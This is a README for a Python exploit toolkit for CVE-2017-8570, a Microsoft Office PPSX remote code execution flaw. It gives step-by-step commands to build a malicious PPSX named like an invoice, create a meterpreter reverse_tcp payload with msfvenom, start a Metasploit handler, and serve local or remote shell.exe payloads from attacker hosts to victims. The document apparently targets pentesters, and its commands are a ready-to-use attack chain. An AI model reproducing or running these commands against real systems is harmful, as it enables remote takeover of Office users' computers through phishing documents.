## Exploit toolkit CVE-2017-8570 - v1.0

Exploit toolkit CVE-2017-8570 - v1.0 is a handy python script which provides pentesters and security researchers a quick and effective way to exploit Microsoft Office PPSX RCE. It could generate a malicious PPSX file and deliver metasploit / meterpreter / other payload to user without any complex configuration.

### Video tutorial (for v1.0)

### Release note:

Introduced following capabilities to the script

	- Generate Malicious PPSX file using -M gen argument
	- Run script in exploitation mode using -M exp argument
	- Deliver custom SCT file ( using -H argument )
	- Deliver remote payload

Version: Python version 2.7.13

### Future release:

Working on following feature

	- Enhance README.md

Note: Before starting, you have to create a folder called Template(require) and moving template.ppsx into the new folder. This is necessary for avoiding a Error!
### Scenario 1: Deliver local payload
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
	   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	3) Start toolkit in exploit mode to deliver local payload
	   # python cve-2017-8570_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe


### Scenario 2: Deliver Remote payload
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) Start toolkit in exploit mode to deliver remote payload
	   # python cve-2017-8570_toolkit.py -M exp -e http://remoteserver.com/shell.exe


### Scenario 3: Deliver custom SCT file
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) Start toolkit in exploit mode to deliver custom SCT file
	   # python cve-2017-8570_toolkit.py -M exp -H /tmp/custom.sct


### Command line arguments:

    # python cve-2017-8570_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-8570 (Microsoft Office PPSX RCE)

    Modes:

    -M gen                                          Generate Malicious PPSX file only

         Generate malicious PPSX file:

          -w <Filename.ppsx>                   Name of malicious PPSX file (Share this file with victim).

          -u <http://attacker.com/test.sct>   The path to an sct file. Normally, this should be a domain or IP where        this                                          tool is running.
	                                      For example, http://attackerip.com/test.sct (This URL will be included in 	                                              malicious PPSX file and will be requested once victim will open malicious PPSX file.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	 
          -H </tmp/custom.sct>                Local path of a custom SCT file which needs to be delivered and executed on target.
	                                          NOTE: This option will not deliver payloads specified through options "-e" and "-l"
						  
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.
